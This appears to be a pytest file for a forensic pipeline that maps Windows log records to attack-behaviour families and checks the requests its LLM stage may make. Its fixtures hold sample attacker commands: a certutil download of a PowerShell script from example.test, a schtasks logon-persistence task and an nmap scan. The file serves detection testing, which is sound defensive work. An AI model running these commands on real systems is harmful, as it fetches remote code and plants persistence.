"""Coverage-guided loopback and behavior re-search contracts."""

from __future__ import annotations

from src.common import io, schema
from src.stage05_interpret import behavior_search, coverage
from src.stage05_interpret.llm_client import investigation_schema
import jsonschema


def _scenario() -> dict:
    return io.new_document(
        "C-SHORT",
        "02_normalize",
        "test",
        target_os="windows_10",
        techniques=[
            {
                "id": "T1091",
                "name": "Replication Through Removable Media",
                "confidence": 0.8,
                "evidence_text": "USB가 꽂힌 뒤",
            }
        ],
        time_range={
            "start": "2026-09-07T13:00:00Z",
            "end": "2026-09-08T01:30:00Z",
            "basis": "수집 시각 주변",
        },
        entities={"hosts": [], "accounts": [], "processes": [], "paths": [], "ips": []},
        overall_confidence=0.5,
        unmapped_text=[],
    )


def _findings(*items: dict) -> dict:
    return io.new_document(
        "C-SHORT",
        "05_interpret",
        "test",
        input_refs=sorted({ref for item in items for ref in item.get("refs", [])}),
        findings=list(items),
        timeline=[],
    )


def _finding(fid: str, technique: str, ref: str, statement: str) -> dict:
    return {
        "id": fid,
        "statement": statement,
        "refs": [ref],
        "claims": [],
        "technique": technique,
        "severity": "medium",
    }


def test_ledger_tracks_all_ten_families_and_empty_categories():
    findings = _findings(
        _finding("F1", "T1091", "SYSMON#1", "USB 장치와 관련된 실행이 관측됐다")
    )
    ledger = coverage.build(
        _scenario(),
        findings,
        raw="키오스크에 USB가 꽂힌 뒤 포스기를 지나 관리서버까지 공격이 진행되었습니다.",
    )

    schema.validate(ledger, "coverage")
    assert len(ledger["categories"]) == 10
    states = {item["id"]: item["status"] for item in ledger["categories"]}
    assert states["initial_access"] == "observed"
    assert states["lateral_movement"] == "not_searched"
    assert "lateral_movement" in ledger["summary"]["gaps"]
    assert any("lateral_movement" in claim["categories"] for claim in ledger["scenario_claims"])


def test_verified_finding_upgrades_only_its_behavior_family():
    findings = _findings(
        _finding("F1", "T1091", "SYSMON#1", "USB 장치가 관측됐다"),
        _finding("F2", "T1046", "SYSMON#2", "포트 스캔이 관측됐다"),
    )
    ledger = coverage.build(_scenario(), findings, raw="USB 이후 POS를 스캔했다")
    verified = {"passed": [{"id": "F2"}], "rejected": [], "unverifiable": []}

    updated = coverage.apply_verified(ledger, findings, verified)

    states = {item["id"]: item["status"] for item in updated["categories"]}
    assert states["discovery"] == "verified"
    assert states["initial_access"] == "observed"


def test_behavior_search_finds_a_short_multi_port_scan_and_process_closure():
    records = [
        {
            "ref": "SYSMON#1",
            "artifact": "evtx:Sysmon",
            "event_id": 1,
            "timestamp": "2026-09-07T13:30:00Z",
            "fields": {
                "Image": "C:/Tools/scanner.exe",
                "CommandLine": "scanner.exe 100.70.51.80",
                "ProcessGuid": "{scan}",
            },
        }
    ]
    for index, port in enumerate((135, 139, 445, 3389), start=2):
        records.append(
            {
                "ref": f"SYSMON#{index}",
                "artifact": "evtx:Sysmon",
                "event_id": 3,
                "timestamp": f"2026-09-07T13:30:0{index}Z",
                "fields": {
                    "Image": "C:/Tools/scanner.exe",
                    "ProcessGuid": "{scan}",
                    "DestinationIp": "100.70.51.80",
                    "DestinationPort": port,
                },
            }
        )

    result = behavior_search.search(records, "discovery", pivots=["POS"])

    assert {"SYSMON#1", "SYSMON#2", "SYSMON#3", "SYSMON#4", "SYSMON#5"} <= set(
        result.refs
    )
    assert result.patterns["multi_port_scan"] >= 1


def test_behavior_search_finds_large_outbound_transfer_without_a_tool_name():
    records = [
        {
            "ref": "SRUM-NET#7",
            "artifact": "srum:network",
            "timestamp": "2026-09-07T14:00:00Z",
            "canonical": {"remote_ip": "142.250.207.110"},
            "fields": {"BytesSent": 50 * 1024 * 1024, "Application": "sync-agent.exe"},
            "flags": [],
        }
    ]

    result = behavior_search.search(records, "exfiltration")

    assert result.refs == ("SRUM-NET#7",)
    assert result.patterns["large_outbound_transfer"] == 1


def test_behavior_family_flags_match_the_parser_attention_flags():
    families = coverage.family_table()

    assert "lolbin_download" in families["execution"]["flags"]
    assert "persistence_command" in families["persistence"]["flags"]
    assert "security_tool_config_changed" in families["defense_evasion"]["flags"]
    assert "uac_bypass_candidate" in families["defense_evasion"]["flags"]


def test_behavior_search_reserves_a_slot_for_a_rare_signal():
    records = []
    for index in range(40):
        records.append(
            {
                "ref": f"SYSMON#{index + 1}",
                "artifact": "evtx:Sysmon",
                "event_id": 1,
                "timestamp": f"2026-09-01T00:{index:02d}:00Z",
                "fields": {
                    "Image": "C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe",
                    "ProcessId": str(index + 1),
                    "CommandLine": f"powershell.exe -Command Write-Output {index}",
                },
                "flags": ["shell_spawned"],
            }
        )
    records.append(
        {
            "ref": "SYSMON#900",
            "artifact": "evtx:Sysmon",
            "event_id": 1,
            "timestamp": "2026-09-07T13:37:57Z",
            "fields": {
                "Image": "C:/Windows/System32/certutil.exe",
                "ProcessId": "900",
                "CommandLine": "certutil -urlcache -split -f http://example.test/s.ps1 s.ps1",
            },
            "flags": ["lolbin_download"],
        }
    )

    result = behavior_search.search(records, "execution")

    assert "SYSMON#900" in result.refs


def test_behavior_search_prioritizes_the_parser_persistence_flag():
    records = [
        {
            "ref": f"SYSMON#{index + 1}",
            "artifact": "evtx:Sysmon",
            "event_id": 1,
            "timestamp": f"2026-09-01T00:{index:02d}:00Z",
            "fields": {
                "Image": "C:/Windows/System32/app.exe",
                "ProcessId": str(index + 1),
                "CommandLine": f"app.exe --startup item-{index}",
            },
            "flags": [],
        }
        for index in range(30)
    ]
    records.append(
        {
            "ref": "SYSMON#901",
            "artifact": "evtx:Sysmon",
            "event_id": 1,
            "timestamp": "2026-09-07T13:38:59Z",
            "fields": {
                "Image": "C:/Windows/System32/schtasks.exe",
                "ProcessId": "901",
                "CommandLine": "schtasks.exe /create /tn Autorun /sc onlogon /f",
            },
            "flags": ["persistence_command"],
        }
    )

    result = behavior_search.search(records, "persistence")

    assert "SYSMON#901" in result.refs


def test_request_behavior_accepts_a_real_scenario_claim_and_promotes_refs():
    raw = "키오스크에 USB가 꽂힌 뒤 포스기를 지나 관리서버까지 공격이 진행되었습니다."
    findings = _findings(_finding("F1", "T1091", "SYSMON#1", "USB가 관측됐다"))
    ledger = coverage.build(_scenario(), findings, raw=raw)
    claim = next(c for c in ledger["scenario_claims"] if "lateral_movement" in c["categories"])
    requests = io.new_document(
        "C-SHORT",
        "05_investigate",
        "test",
        round=1,
        requests=[
            {
                "type": "request_behavior",
                "based_on": {"kind": "scenario_claim", "claim_id": claim["id"]},
                "rationale": "노드 간 이동 흔적을 다시 검색한다",
                "category": "lateral_movement",
                "pivots": ["POS"],
            }
        ],
    )
    records = [
        {
            "ref": "SYSMON#20",
            "artifact": "evtx:Sysmon",
            "event_id": 3,
            "timestamp": "2026-09-07T13:35:00Z",
            "canonical": {"remote_ip": "100.70.51.80", "command_line": "nmap -p 445 POS"},
            "fields": {"DestinationIp": "100.70.51.80", "DestinationPort": 445},
        }
    ]

    promoted = behavior_search.apply_requests(
        requests,
        ledger,
        records,
        input_refs=set(findings["input_refs"]),
    )

    schema.validate(requests, "investigation")
    schema.validate(ledger, "coverage")
    assert promoted == {"SYSMON#20"}
    assert requests["requests"][0]["disposition"]["verdict"] == "accepted"
    assert "SYSMON#20" in coverage.promoted_refs(ledger)


def test_request_behavior_rejects_a_forged_scenario_claim():
    findings = _findings(_finding("F1", "T1091", "SYSMON#1", "USB가 관측됐다"))
    ledger = coverage.build(_scenario(), findings, raw="USB 이후 POS로 이동")
    requests = io.new_document(
        "C-SHORT",
        "05_investigate",
        "test",
        round=1,
        requests=[
            {
                "type": "request_behavior",
                "based_on": {"kind": "scenario_claim", "claim_id": "SC999"},
                "rationale": "없는 입력 근거",
                "category": "lateral_movement",
                "pivots": [],
            }
        ],
    )

    promoted = behavior_search.apply_requests(
        requests, ledger, [], input_refs=set(findings["input_refs"])
    )

    assert promoted == set()
    assert requests["requests"][0]["disposition"]["reason"] == "ungrounded_claim"


def test_constrained_investigation_output_allows_only_enumerated_claim_and_family():
    output_schema = investigation_schema(
        ["SYSMON#1"],
        ["SYSMON#1"],
        [],
        [],
        ["lateral_movement"],
        ["SC1"],
    )
    valid = {
        "investigation_requests": [
            {
                "type": "request_behavior",
                "based_on": {"kind": "scenario_claim", "claim_id": "SC1"},
                "rationale": "노드 간 이동 흔적을 재검색",
                "category": "lateral_movement",
                "pivots": ["POS"],
            }
        ]
    }

    jsonschema.Draft202012Validator(output_schema).validate(valid)

    invalid = {**valid, "investigation_requests": [{**valid["investigation_requests"][0], "category": "impact"}]}
    assert list(jsonschema.Draft202012Validator(output_schema).iter_errors(invalid))
